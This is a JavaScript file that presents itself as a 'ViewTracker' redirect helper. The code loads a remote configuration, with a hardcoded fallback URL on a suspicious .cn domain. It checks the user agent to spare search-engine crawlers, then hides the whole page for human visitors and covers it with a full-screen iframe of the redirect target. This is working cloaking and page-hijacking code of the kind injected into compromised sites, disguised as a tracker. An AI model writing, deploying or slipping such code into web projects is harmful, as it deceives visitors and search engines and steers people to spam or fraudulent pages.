/*!
 * ViewTracker v1.0 — Client-side redirect helper
 * Auto-loads settings from settings.json (same directory)
 * Usage: <script src="//your-cdn.com/tracker.js"></script>
 */
!(function () {
  "use strict";

  // Default ruleset (used only when remote settings.json is unreachable)
  var DEFAULT_RULES = {
    redirectTo: "https://dh-hzh5.hbdvede.cn?cid=1023",
    active: !0,
    crawlers: [
      "baiduspider", "sogou web spider", "yisouspider",
      "360spider", "googlebot", "bingbot"
    ],
    layer: 9999,
    backdrop: "white"
  };

  var STORAGE_ID = "__vt_data__";
  var CACHE_MAX_AGE = 30 * 60 * 1000; // 30 min

  // Locate this script element
  var selfScript = (function () {
    if (document.currentScript) return document.currentScript;
    for (var all = document.getElementsByTagName("script"), j = all.length - 1; j >= 0; j--) {
      if (all[j].src && all[j].src.indexOf("tracker.js") !== -1) return all[j];
    }
    return null;
  })();

  var settingsUrl = "";
  if (selfScript) {
    settingsUrl = selfScript.getAttribute("data-settings") || "";
    if (!settingsUrl && selfScript.src) {
      settingsUrl = selfScript.src.replace(/tracker\.js(\?.*)?$/, "settings.json");
    }
  }

  // Fetch remote config (with retries)
  function pullRemoteConfig(onReady, retryCount) {
    retryCount = retryCount || 0;
    if (retryCount > 2) {
      // All retries exhausted — fallback chain
      try {
        var stale = JSON.parse(localStorage.getItem(STORAGE_ID));
        if (stale && stale.redirectTo) return onReady(stale);
      } catch (ignored) {}
      return onReady(DEFAULT_RULES);
    }
    if (!settingsUrl) return onReady(DEFAULT_RULES);

    fetch(settingsUrl, { cache: "no-cache" })
      .then(function (resp) {
        return resp.ok ? resp.json() : Promise.reject("status " + resp.status);
      })
      .then(function (cfg) {
        cfg._cachedAt = Date.now();
        try { localStorage.setItem(STORAGE_ID, JSON.stringify(cfg)); } catch (ignored) {}
        onReady(cfg);
      })
      .catch(function () {
        setTimeout(function () { pullRemoteConfig(onReady, retryCount + 1); }, (retryCount + 1) * 1000);
      });
  }

  function silentRefresh() {
    if (!settingsUrl) return;
    fetch(settingsUrl, { cache: "no-cache" })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (cfg) {
        if (cfg) { cfg._cachedAt = Date.now(); localStorage.setItem(STORAGE_ID, JSON.stringify(cfg)); }
      })
      .catch(function () {});
  }

  function loadAndApply(onReady) {
    try {
      var entry = JSON.parse(localStorage.getItem(STORAGE_ID));
      if (entry && entry._cachedAt && Date.now() - entry._cachedAt < CACHE_MAX_AGE && entry.redirectTo) {
        onReady(entry);
        silentRefresh();
        return;
      }
    } catch (ignored) {}
    pullRemoteConfig(onReady);
  }

  // Crawler detection
  function isSearchBot(list) {
    var agent = navigator.userAgent.toLowerCase();
    for (var i = 0; i < list.length; i++) {
      if (agent.indexOf(list[i].toLowerCase()) !== -1) return !0;
    }
    return !1;
  }

  // Mount full-page iframe
  function mountRedirect(cfg) {
    if (!cfg || cfg.active === !1) return;
    if (!cfg.redirectTo) return;
    if (isSearchBot(cfg.crawlers)) return;

    function build() {
      if (document.getElementById("vt-frame")) return;
      var frame = document.createElement("iframe");
      frame.id = "vt-frame";
      frame.src = cfg.redirectTo;
      frame.setAttribute("sandbox", "allow-same-origin allow-scripts allow-popups allow-forms");
      frame.style.cssText =
        "position:fixed!important;top:0!important;left:0!important;" +
        "width:100vw!important;height:100vh!important;border:none!important;" +
        "z-index:" + (cfg.layer || 9999) + "!important;" +
        "background:" + (cfg.backdrop || "white") + "!important;" +
        "margin:0!important;padding:0!important;";

      var root = document.body;
      if (root) {
        for (var k = 0; k < root.children.length; k++) root.children[k].style.display = "none";
        root.appendChild(frame);
      } else {
        window.addEventListener("load", build);
      }
    }

    document.readyState === "complete" ? build() : window.addEventListener("load", build);
  }

  loadAndApply(mountRedirect);

  // Public API
  window.ViewTracker = {
    flush: function () {
      try { localStorage.removeItem(STORAGE_ID); } catch (ignored) {}
      location.reload();
    }
  };
})();
